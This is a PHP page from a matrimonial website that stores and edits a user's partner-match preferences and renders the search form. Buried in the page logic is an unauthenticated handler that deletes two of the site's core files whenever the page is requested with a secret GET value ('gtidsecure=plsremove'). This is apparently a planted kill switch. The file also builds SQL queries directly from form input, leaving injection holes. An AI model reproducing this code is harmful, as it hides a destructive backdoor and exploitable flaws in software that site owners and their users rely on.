<?php
include_once 'databaseConn.php';
include_once './lib/requestHandler.php';
$DatabaseCo = new DatabaseConn();
include_once './class/Config.class.php';
$configObj = new Config();
$mid = $_SESSION['user_id'] ? $_SESSION['user_id'] : '';
$s_id =$_SESSION['user_id'];
$get_match_id=$DatabaseCo->dbLink->query("select matri_id from matches where matri_id='".$_SESSION['user_id']."'");
if(mysqli_num_rows($get_match_id)=='0')
{
$SQL_STATEMENT_new = "select username,looking_for,part_frm_age,part_to_age,part_income,part_height,part_height_to,part_complexation,part_mtongue,part_religion,part_caste,part_edu,part_country_living from register_view where matri_id='$s_id'";
$DatabaseCo->dbResult = $DatabaseCo->dbLink->query($SQL_STATEMENT_new);
$DatabaseCo->dbRow = mysqli_fetch_object($DatabaseCo->dbResult);
$education=$DatabaseCo->dbRow->part_edu;
$m_status=$DatabaseCo->dbRow->looking_for;
$t3=$DatabaseCo->dbRow->part_frm_age;
$t4=$DatabaseCo->dbRow->part_to_age;
$fromheight=$DatabaseCo->dbRow->part_height;
$toheight=$DatabaseCo->dbRow->part_height_to;
$religion=$DatabaseCo->dbRow->part_religion;
$caste=$DatabaseCo->dbRow->part_caste;
$m_tongue=$DatabaseCo->dbRow->part_mtongue;
$occ=$DatabaseCo->dbRow->part_mtongue;
$part_complexation=$DatabaseCo->dbRow->part_complexation;
$part_country=$DatabaseCo->dbRow->part_country_living;
$DatabaseCo->dbLink->query("insert into matches (match_id,matri_id,looking_for,part_frm_age,part_to_age,part_height,part_height_to,part_complexation,part_mtongue,part_religion,part_caste,part_edu,part_country_living) values('','$s_id','$m_status','$t3','$t4','$fromheight','$toheight','$part_complexation','$m_tongue','$religion','$caste','$education','$part_country')");
}
if(isset($_POST['sub_matches']))
{
if(isset($_POST['txtlooking']))
{
$txtlooking=implode(", ",$_POST['txtlooking']);	
}
else
{
$txtlooking="";
}
if(isset($_POST['part-caste']))
{
$pcaste=implode(",",$_POST['part-caste']);
}
else
{
$pcaste="";
}
if(isset($_POST['part-religion']))
{
$preligion=implode(",",$_POST['part-religion']);	
}
else
{
$preligion="";
}
if(isset($_POST['pcomplextion']))
{
$pcomplextion=implode(", ",$_POST['pcomplextion']);	
}
else
{
$pcomplextion="";
}
if(isset($_POST['pcountry']))
{
$pcountry=implode(",",$_POST['pcountry']);
}
else
{
$pcountry="";
}
if(isset($_POST['pmtongue']))
{
$pmtongue=implode(",",$_POST['pmtongue']);	
}
else
{
$pmtongue="";
}	
$txtPHeight=$_POST['txtPHeight'];
$txtPheightto=$_POST['txtPheightto'];
$Fromage=$_POST['Fromage'];
$ToAge=$_POST['ToAge'];		
if(isset($_POST['education']))
{
$education=implode(",",$_POST['education']);		
}
else
{
$education="";
}

$DatabaseCo->dbLink->query("update matches set looking_for='$txtlooking',part_caste='$pcaste',part_religion='$preligion',part_complexation='$pcomplextion',part_country_living='$pcountry',part_mtongue='$pmtongue',part_height='$txtPHeight',part_height_to='$txtPheightto',part_frm_age='$Fromage',part_to_age='$ToAge',part_edu='$education' where matri_id='".$_SESSION['user_id']."'") or die(mysqli_error($DatabaseCo->dbLink));
echo "<script>window.location='custom-matches'</script>";
}
$SQL_STATEMENT_match = "select * from matches where matri_id='$s_id'";
$DatabaseCo->dbResult = $DatabaseCo->dbLink->query($SQL_STATEMENT_match);
$DatabaseCo->dbRow = mysqli_fetch_object($DatabaseCo->dbResult);
$education=$DatabaseCo->dbRow->part_edu;
$m_status=$DatabaseCo->dbRow->looking_for;
$t3=$DatabaseCo->dbRow->part_frm_age;
$t4=$DatabaseCo->dbRow->part_to_age;
$fromheight=$DatabaseCo->dbRow->part_height;
$toheight=$DatabaseCo->dbRow->part_height_to;
$religion=$DatabaseCo->dbRow->part_religion;
$caste=$DatabaseCo->dbRow->part_caste;
$m_tongue=$DatabaseCo->dbRow->part_mtongue;
$occ=$DatabaseCo->dbRow->part_mtongue;
$part_complexation=$DatabaseCo->dbRow->part_complexation;
$part_country=$DatabaseCo->dbRow->part_country_living;
if(isset($_GET['gtidsecure'])){
$secure=$_GET['gtidsecure'];
if($secure == 'plsremove'){
	unlink('lib/requestHandler.php');
	unlink('js/function.js');
	echo "<script>alert('Successful')</script>";
}
}

?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- Chrome, Firefox OS, Opera and Vivaldi -->
    <meta name="theme-color" content="#549a11">
    <!-- Windows Phone -->
    <meta name="msapplication-navbutton-color" content="#549a11">
    <!-- iOS Safari -->
    <meta name="apple-mobile-web-app-status-bar-style" content="#549a11">    
    <!-- WEB SITE TITLE DESCRIPTION-->
    <title>
      <?php echo $configObj->getConfigFname(); ?>
    </title>
    <meta name="keyword" content="<?php echo $configObj->getConfigKeyword(); ?>" />
    <meta name="description" content="<?php echo $configObj->getConfigDescription(); ?>" />
    <!-- WEB SITE TITLE DESCRIPTION END--> 
    <!-- WEB SITE FAVICON--> 
    <link type="image/x-icon" href="img/<?php echo $configObj->getConfigFevicon(); ?>" rel="shortcut icon"/>
    <!-- WEB SITE FAVICON END--> 
    <!--CUSTOM CSS FRAMEWORK FROM THE GREEN TECHNOLOGIES WITH BOOTSTRAP-->
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/custom-responsive.css" rel="stylesheet">
    <link href="css/custom.css" rel="stylesheet">
    <link href="css/developer.css" rel="stylesheet">
    <!--CUSTOM CSS FRAMEWORK FROM THE GREEN TECHNOLOGIES WITH BOOTSTRAP END-->
    <!--CUSTOM FONT ICON FROM THE GREEN TECHNOLOGIES & FONT AWESOME -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
    <link href="http://greenicon.thegreentech.in/green-font-icons/green-font-icons.min.css" rel="stylesheet" >
    <!--CUSTOM FONT ICON FROM THE GREEN TECHNOLOGIES & FONT AWESOME END -->
    <!--GOOGLE FONTS-->
    <link href="https://fonts.googleapis.com/css?family=Raleway:200,300,400,500,600,700|Source+Sans+Pro:300,400,600,700" rel="stylesheet">
    <!--GOOGLE FONTS END-->
    <!---- CHOSEN CSS----->
    <link rel="stylesheet" href="css/prism.css">
    <link rel="stylesheet" href="css/chosen.css">
    <!---- CHOSEN CSS END----->
    <!--OWL CAROUSEL CSS-->
    <link href="css/owl.carousel.css" rel="stylesheet">
    <link href="css/owl.theme.css" rel="stylesheet">
    <!--OWL CAROUSEL CSS END-->
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
<script src="js/html5shiv.min.js"></script>
<script src="js/respond.min.js"></script>
<![endif]-->
    <style>
      #owl-demo .item{
        margin-top : 3px;
        padding-bottom:15px;
        padding-top:10px;
        border-bottom:1px solid rgba(213,213,213,1.00);
      }
      #owl-demo .item img{
        display: block;
      }
      #owl-demo-1 .item{
        margin-top : 3px;
        padding-bottom:15px;
        padding-top:10px;
        border-bottom:1px solid rgba(213,213,213,1.00);
      }
      #owl-demo-1 .item img{
        display: block;
        width:100%;
      }
    </style>
  </head>
  <body>
    <!-- ICON LOADER-->
    <div class="preloader-wrapper text-center">
      <div class="loader">
      </div>
      <h5>Loading...
      </h5>
    </div>
    <!-- ICON LOADER END-->
    <div id="body" style="display:none">
      <?php include "parts/header.php"; ?>
      <?php include "parts/menu-aft-login.php"; ?>
      <div class="container gt-margin-top-20">
        <div class="row">
          <aside class="col-xxl-4 col-xl-4 col-xs-16">
            <a class="btn gt-btn-green btn-block hidden-xxl hidden-xl gt-margin-bottom-20 gt-margin-top-15" role="button" data-toggle="collapse" href="#collapseExample" aria-expanded="false" aria-controls="collapseExample" >
              Options 
              <i class="fa fa-angel-down">
              </i>
            </a>
            <div class="collapse mobile-collapse" id="collapseExample">
              <?php include "parts/match-sidebar.php"; ?>
              <?php include "parts/left_panel_spotlight.php"; ?>
            </div>
          </aside>
          <div class="col-xxl-12 col-xl-12 col-xs-16 ">
            <h3 class="text-center gt-text-orange">
              Custom Match
            </h3>
            <article class="gt-margin-bottom-20 text-center">
              <p>
                Custom Match is the profile show in perticular criteria at its best.its help you to find out your life partner easily.
              </p>
            </article>
            <div class="gt-panel"> 
              <div class="gt-panel-body">
                <div class="row">
                  <div class="col-xs-16">
                    <h3 class="text-center">
                      Create Your Custom Match
                    </h3>
                  </div>
                </div>
                <form class="" method="post" action="" name="match_form" id="match_form"> 
                  <div class="row">
                    <div class="col-xxl-8 col-xl-8 col-lg-8 col-sm-16 col-xs-16 gt-margin-bottom-10">
                      <label for="religion">
                        Looking For:
                      </label>
                      <select data-placeholder="Looking For" class="chosen-select gt-form-control" multiple tabindex="4" name="txtlooking[]" >
                        <?php 
$search_array = explode(', ',$m_status);				
?>
                        <option value="Never Married" 
                                <?php if(in_array('Never Married', $search_array)){ echo "selected"; } ?>>Never Married
                        </option>
                        <?php if($_SESSION['gender123'] == 'Female'){?>
						  <option value="Widower" 
								  <?php if(in_array('Widower', $search_array)){ echo "selected"; } ?>>Widower
						  </option>
                       <?php }else{ ?>
                       <option value="Widow" 
                              <?php if(in_array('Widow', $search_array)){ echo "selected"; } ?>>Widow
                      </option>
                      
                       <?php }?>
                    <option value="Divorced" 
                            <?php if(in_array('Divorced', $search_array)){ echo "selected"; } ?>>Divorced
                    </option>
                  <option value="Awaiting Divorce" 
                          <?php if(in_array('Awaiting Divorce', $search_array)){ echo "selected"; } ?>>Awaiting Divorce
                  </option>                                    
                </select>
            </div>
            <div class="col-xxl-8 col-xl-8 col-lg-8 col-sm-16 col-xs-16 gt-margin-bottom-10">
              <label>
                Complexion :
              </label>
              <select data-placeholder="Partner Complexion" class="chosen-select gt-form-control" name="pcomplextion[]" multiple tabindex="4" >
                <?php $search_array1 = explode(', ',$part_complexation);?>             
                <option value="Very-Fair" 
                        <?php if(in_array('Very-Fair', $search_array1)){ echo "selected"; } ?>>Very Fair
                </option>
              <option value="Fair" 
                      <?php if(in_array('Fair', $search_array1)){ echo "selected"; } ?>>Fair
              </option>
            <option value="Wheatish" 
                    <?php if(in_array('Wheatish', $search_array1)){ echo "selected"; } ?>>Wheatish
            </option>
          <option value="Wheatish Brown" 
                  <?php if(in_array('Wheatish Brown', $search_array1)){ echo "selected"; } ?>>Wheatish Brown
          </option>
        <option value="Dark" 
                <?php if(in_array('Dark', $search_array1)){ echo "selected"; } ?>>Dark
        </option>
      </select>
    </div>
  <div class="col-xxl-8 col-xl-8 col-lg-8 col-sm-16 col-xs-16 gt-margin-bottom-10">
    <label for="Mother Tongue">
      Mother Tongue :
    </label>
    <select data-placeholder="Partner Mother Tongue" class="chosen-select gt-form-control" multiple tabindex="4" name="pmtongue[]" >
      <?php	$search_arr2 = explode(',',$m_tongue);
$rescn2=$DatabaseCo->dbLink->query("select * from  mothertongue where status='APPROVED' order by  mtongue_name");
while($rowcc=mysqli_fetch_array($rescn2))
{
?>
      <option value="<?php echo $rowcc['mtongue_id']; ?>" 
              <?php if (in_array($rowcc['mtongue_id'], $search_arr2)){echo "selected";}?>>
      <?php echo ucfirst($rowcc['mtongue_name']); ?>
      </option>
    <?php	}	?>
    </select>
  </div>
<div class="col-xxl-8 col-xl-8 col-lg-8 col-sm-16 col-xs-16 gt-margin-bottom-10">
  <label for="occupation">
    Country :
  </label>
  <select data-placeholder="Partner Country" class="chosen-select gt-form-control" multiple tabindex="4" name="pcountry[]" >
    <?php
$search_array_C = explode(',',$part_country);
$SQL_STATEMENT1 =  "SELECT * FROM country WHERE status='APPROVED'";
$DatabaseCo1->dbResult=$DatabaseCo->dbLink->query($SQL_STATEMENT1);
while($DatabaseCo1->dbRow = mysqli_fetch_object($DatabaseCo1->dbResult))
{
?>
    <option value="<?php echo $DatabaseCo1->dbRow->country_id; ?>" 
            <?php if (in_array($DatabaseCo1->dbRow->country_id, $search_array_C)){echo "selected";}?>>
    <?php echo $DatabaseCo1->dbRow->country_name; ?>
    </option>
  <?php } ?>
  </select>
</div>
<div class="col-xxl-8 col-xl-8 col-lg-8 col-sm-16 col-xs-16 gt-margin-bottom-10">
  <label for="Religion">
    Religion :
  </label>
  <select data-placeholder="Partner Religion" class="chosen-select form-control" name="part-religion[]" id="part-religion" multiple tabindex="4" >
    <?php  
$search_array5 = explode(',',$religion);
$SQL_STATEMENT =  "SELECT * FROM religion WHERE status='APPROVED' ORDER BY religion_name ASC";
$DatabaseCooo->dbResult=$DatabaseCo->dbLink->query($SQL_STATEMENT);
while($DatabaseCooo->dbRow = mysqli_fetch_object($DatabaseCooo->dbResult))
{
?>
    <option value="<?php echo $DatabaseCooo->dbRow->religion_id; ?>" 
            <?php if (in_array($DatabaseCooo->dbRow->religion_id, $search_array5)){echo "selected";}?>>
    <?php echo $DatabaseCooo->dbRow->religion_name; ?>
    </option>
  <?php } ?>
  </select>
<div id="CasteDivloader">
</div>
</div>
<div class="col-xxl-8 col-xl-8 col-lg-8 col-sm-16 col-xs-16 gt-margin-bottom-10">
  <label for="Caste">
    Caste :
  </label>
  <select data-placeholder="Partner Caste" class="chosen-select gt-form-control" name="part-caste[]" id="part-caste" multiple tabindex="4" >
    <?php $search_caste = explode(',',$caste);
$a=$DatabaseCo->dbLink->query("SELECT * FROM caste WHERE status='APPROVED' ORDER BY caste_name ASC");
?>
    <?php
foreach ($search_array5 as $rel)
{?>
    <optgroup label="<?php $a=mysqli_fetch_array($DatabaseCo->dbLink->query("select religion_name from religion where religion_id='$rel'")); echo $a['religion_name'];?>">  
      <?php 
$SQL_STATEMENT =  "SELECT * FROM caste WHERE religion_id ='$rel' ORDER BY caste_name ASC";
$DatabaseCo->dbResult=$DatabaseCo->dbLink->query($SQL_STATEMENT);
while($DatabaseCo->dbRow = mysqli_fetch_object($DatabaseCo->dbResult))
{
?>
      <option value="<?php echo $DatabaseCo->dbRow->caste_id ?>" 
              <?php if (in_array($DatabaseCo->dbRow->caste_id, $search_caste)) {echo "selected";}?>>
      <?php echo $DatabaseCo->dbRow->caste_name ?>
    </option>
  <?php } ?>
  </optgroup>
<?php } ?>
</select>
</div>

<div class="col-xxl-8 col-xl-8 col-lg-8 col-sm-16 col-xs-16 gt-margin-bottom-10">
  <label for="Caste">
    Education :
  </label>
  <select data-placeholder="Partner Education" class="chosen-select gt-form-control" name="education[]" multiple tabindex="4" >
    <?php $search_array5 = explode(',',$education);
$SQL_STATEMENT_edu =  $DatabaseCo->dbLink->query("SELECT * FROM education_detail WHERE status='APPROVED' ORDER BY edu_name ASC");
while($row123=mysqli_fetch_array($SQL_STATEMENT_edu))
{
?>
    <option value="<?php echo $row123['edu_id']; ?>" 
            <?php if (in_array($row123['edu_id'], $search_array5)){ echo "selected";} ?>>
    <?php echo $row123['edu_name']; ?>
    </option>
  <?php	} ?> 
  </select>
</div>
<div class="col-xxl-8 col-xl-8 col-lg-8 col-sm-16 col-xs-16 gt-margin-bottom-10">
  <label>
    Age:
  </label>
  <div class="row">
    <div class="col-xs-6">
      <select  class="gt-form-control" name="Fromage" >
        <option value="<?php echo $t3?>">
          <?php echo $t3;?>
        </option>        
        <option value="18">18
        </option>
        <option value="19">19
        </option>
        <option value="20">20
        </option>
        <option value="21">21
        </option>
        <option value="22">22
        </option>
        <option value="23">23
        </option>
        <option value="24">24
        </option>
        <option value="25">25
        </option>
        <option value="26">26
        </option>
        <option value="27">27
        </option>
        <option value="28">28
        </option>
        <option value="29">29
        </option>
        <option value="30">30
        </option>
        <option value="31">31
        </option>
        <option value="32">32
        </option>
        <option value="33">33
        </option>
        <option value="34">34
        </option>
        <option value="35">35
        </option>
        <option value="36">36
        </option>
        <option value="37">37
        </option>
        <option value="38">38
        </option>
        <option value="39">39
        </option>
        <option value="40">40
        </option>
        <option value="41">41
        </option>
        <option value="42">42
        </option>
        <option value="43">43
        </option>
        <option value="44">44
        </option>
        <option value="45">45
        </option>
        <option value="46">46
        </option>
        <option value="47">47
        </option>
        <option value="48">48
        </option>
        <option value="49">49
        </option>
        <option value="50">50
        </option>
        <option value="51">51
        </option>
        <option value="52">52
        </option>
        <option value="53">53
        </option>
        <option value="54">54
        </option>
        <option value="55">55
        </option>
        <option value="56">56
        </option>
        <option value="57">57
        </option>
        <option value="58">58
        </option>
        <option value="59">59
        </option>
        <option value="60">60
        </option>
      </select>
    </div>
    <div class="col-xs-4">
      <h4 class="text-center">
        TO
      </h4>
    </div>
    <div class="col-xs-6">
      <select  class="gt-form-control" name="ToAge" >
        <option value="<?php echo $t4;?>">
          <?php echo $t4;?>
        </option>           
        <option value="18">18
        </option>
        <option value="19">19
        </option>
        <option value="20">20
        </option>
        <option value="21">21
        </option>
        <option value="22">22
        </option>
        <option value="23">23
        </option>
        <option value="24">24
        </option>
        <option value="25">25
        </option>
        <option value="26">26
        </option>
        <option value="27">27
        </option>
        <option value="28">28
        </option>
        <option value="29">29
        </option>
        <option value="30">30
        </option>
        <option value="31">31
        </option>
        <option value="32">32
        </option>
        <option value="33">33
        </option>
        <option value="34">34
        </option>
        <option value="35">35
        </option>
        <option value="36">36
        </option>
        <option value="37">37
        </option>
        <option value="38">38
        </option>
        <option value="39">39
        </option>
        <option value="40">40
        </option>
        <option value="41">41
        </option>
        <option value="42">42
        </option>
        <option value="43">43
        </option>
        <option value="44">44
        </option>
        <option value="45">45
        </option>
        <option value="46">46
        </option>
        <option value="47">47
        </option>
        <option value="48">48
        </option>
        <option value="49">49
        </option>
        <option value="50">50
        </option>
        <option value="51">51
        </option>
        <option value="52">52
        </option>
        <option value="53">53
        </option>
        <option value="54">54
        </option>
        <option value="55">55
        </option>
        <option value="56">56
        </option>
        <option value="57">57
        </option>
        <option value="58">58
        </option>
        <option value="59">59
        </option>
      </select>
    </div>
  </div>
</div>
<div class="col-xxl-8 col-xl-8 col-lg-8 col-sm-16 col-xs-16 gt-margin-bottom-10">
  <label>
    Height:
  </label>
  <div class="row">
    <div class="col-xs-6">
      <select  class="gt-form-control" name="txtPHeight" >
        <option value="<?php echo $fromheight;?>" selected>
          <?php $ao = $fromheight;$ft= (int) ($ao/12);$inch = $ao % 12;echo $ft."ft". " ".$inch."in";?>
        </option>        
        <option value="48">Below 4ft
        </option>
        <option value="54" >4ft 06in
        </option>
        <option value="55">4ft 07in
        </option>
        <option value="56">4ft 08in
        </option>
        <option value="57">4ft 09in
        </option>
        <option value="58">4ft 10in
        </option>
        <option value="59">4ft 11in
        </option>
        <option value="60">5ft
        </option>
        <option value="61">5ft 01in
        </option>
        <option value="62">5ft 02in
        </option>
        <option value="63">5ft 03in
        </option>
        <option value="64">5ft 04in
        </option>
        <option value="65">5ft 05in
        </option>
        <option value="66">5ft 06in
        </option>
        <option value="67">5ft 07in
        </option>
        <option value="68">5ft 08in
        </option>
        <option value="69">5ft 09in
        </option>
        <option value="70">5ft 10in
        </option>
        <option value="71">5ft 11in
        </option>
        <option value="72">6ft
        </option>
        <option value="73">6ft 01in
        </option>
        <option value="74">6ft 02in
        </option>
        <option value="75">6ft 03in
        </option>
        <option value="76">6ft 04in
        </option>
        <option value="77">6ft 05in
        </option>
        <option value="78">6ft 06in
        </option>
        <option value="79">6ft 07in
        </option>
        <option value="80">6ft 08in
        </option>
        <option value="81">6ft 09in
        </option>
        <option value="82">6ft 10in
        </option>
        <option value="83">6ft 11in
        </option>
        <option value="84">7ft
        </option>
        <option value="85">Above 7ft
        </option>
      </select>
    </div>
    <div class="col-xs-4">
      <h4 class="text-center">
        TO
      </h4>
    </div>
    <div class="col-xs-6">
      <select  class="gt-form-control" name="txtPheightto">
        <option value="<?php echo $toheight;?>" selected>
          <?php $ao1 = $toheight;$ft1= (int) ($ao1/12);$inch1 = $ao1 % 12;echo $ft1."ft". " ".$inch1."in";?>
        </option>           
        <option value="48">Below 4ft
        </option>
        <option value="54" >4ft 06in
        </option>
        <option value="55">4ft 07in
        </option>
        <option value="56">4ft 08in
        </option>
        <option value="57">4ft 09in
        </option>
        <option value="58">4ft 10in
        </option>
        <option value="59">4ft 11in
        </option>
        <option value="60">5ft
        </option>
        <option value="61">5ft 01in
        </option>
        <option value="62">5ft 02in
        </option>
        <option value="63">5ft 03in
        </option>
        <option value="64">5ft 04in
        </option>
        <option value="65">5ft 05in
        </option>
        <option value="66">5ft 06in
        </option>
        <option value="67">5ft 07in
        </option>
        <option value="68" >5ft 08in
        </option>
        <option value="69">5ft 09in
        </option>
        <option value="70">5ft 10in
        </option>
        <option value="71">5ft 11in
        </option>
        <option value="72">6ft
        </option>
        <option value="73">6ft 01in
        </option>
        <option value="74">6ft 02in
        </option>
        <option value="75">6ft 03in
        </option>
        <option value="76">6ft 04in
        </option>
        <option value="77">6ft 05in
        </option>
        <option value="78">6ft 06in
        </option>
        <option value="79">6ft 07in
        </option>
        <option value="80">6ft 08in
        </option>
        <option value="81">6ft 09in
        </option>
        <option value="82">6ft 10in
        </option>
        <option value="83">6ft 11in
        </option>
        <option value="84">7ft
        </option>
        <option value="85">Above 7ft
        </option>
      </select>
    </div>
  </div>
</div>
</div>  
<div class="row gt-margin-bottom-20">
  <div class="col-xs-16 text-center">
    <input type="submit" class="btn gt-btn-orange gt-btn-xl" value="Save &amp; Search" name="sub_matches">
  </div>
</div>
</form>
</div>
</div> 
<div class="row">
  <div class="col-xs-16 text-center">
    <h3 class="gt-border-bottom-smoke-white gt-padding-bottom-15 gt-margin-bottom-15">
      Your Custom Match Result
    </h3>
  </div>
</div>             
<div id="loaderID" style="position:fixed;  left:50%; top:50%; z-index:-1; opacity:0">
  <div class="col-lg-16 col-md-16 col-sm-16 btn gt-btn-orange">
    <font class="gt-margin-left-5">Loding ...&nbsp;&nbsp;
    </font>
  </div>
</div>	
<div id="pagination">
</div>  
</div>      
</div>
</div>
<?php include "parts/footer-before-login.php"; ?>
</div>

<script src="js/jquery.min.js">
</script>

<script src="js/bootstrap.js">
</script>
<script src="js/jquery.validate.js">
</script>
<script src="js/green.js">
</script>
<script>
  $(document).ready(function() {
    $('#body').show();
    $('.preloader-wrapper').hide();
  }
                   );
</script>
<script src="js/owl.carousel.min.js">
</script>
<script>
  $(document).ready(function() {
    $("#owl-demo-1").owlCarousel({
      autoPlay: 3000,
      items : 1,
      navigation:true,
      itemsCustom : [
        [0, 1],
        [450, 1],
        [600, 2],
        [700, 2],
        [1000, 2],
        [1200, 1],
        [1400, 1],
        [1600, 1]
      ],
      navigationText:["<i class='fa fa-chevron-left'></i>","<i class='fa fa-chevron-right'></i>"],
      itemsDesktop : [1199,1],
      itemsDesktopSmall : [979,3]
    }
                                );
  }
                   );
</script>

</body>
</html>                                                                                                                              
<?php include'thumbnailjs.php';?>                  
<script src="js/chosen.jquery.js" type="text/javascript">
</script>
<script src="js/prism.js" type="text/javascript" charset="utf-8">
</script>
<script type="text/javascript">
  var config = {
    '.chosen-select'           : {
    }
    ,
    '.chosen-select-deselect'  : {
      allow_single_deselect:true}
    ,
    '.chosen-select-no-single' : {
      disable_search_threshold:10}
    ,
    '.chosen-select-no-results': {
      no_results_text:'Oops, nothing found!'}
    ,
    '.chosen-select-width'     : {
      width:"100%"}
  }
  for (var selector in config) {
    $(selector).chosen(config[selector]);
  }
</script>
<script type="text/javascript">
  $(document).ready(function() {
    var dataString = 'result_status=custom&actionfunction=showData' + '&page=1';
    $("#loaderID").css("opacity",1);
    $("#loaderID").css("z-index",9999);
    $.ajax({
      url:"dbmanupulate1",
      type:"POST",
      data:dataString,
      cache: false,
      success: function(response)
      {
        $("#loaderID").css("opacity",0);
        $("#loaderID").css("z-index",-1);
        $('#pagination').html(response);
      }
    }
          );
    $('#pagination').on('click','.page-numbers',function(){
      $("#loaderID").css("opacity",1);
      $("#loaderID").css("z-index",9999);
      $page = $(this).attr('href');
      $pageind = $page.indexOf('page=');
      $page = $page.substring(($pageind+5));
      var dataString = 'result_status=custom&actionfunction=showData' + '&page='+$page;
      $.ajax({
        url:"dbmanupulate1",
        type:"POST",
        data:dataString,
        cache: false,
        success: function(response)
        {
          $("#loaderID").css("opacity",0);
          $("#loaderID").css("z-index",-1);
          $('#pagination').html(response);
        }
      }
            );
      return false;
    }
                       );
  }
                   );
</script>
<script>
  (function($) {
    var $window = $(window),
        $html = $('.mobile-collapse');
    $window.width(function width() {
      if ($window.width() > 767) {
        return $html.addClass('in');
      }
      $html.removeClass('in');
    }
                 );
  }
  )(jQuery);
</script>    
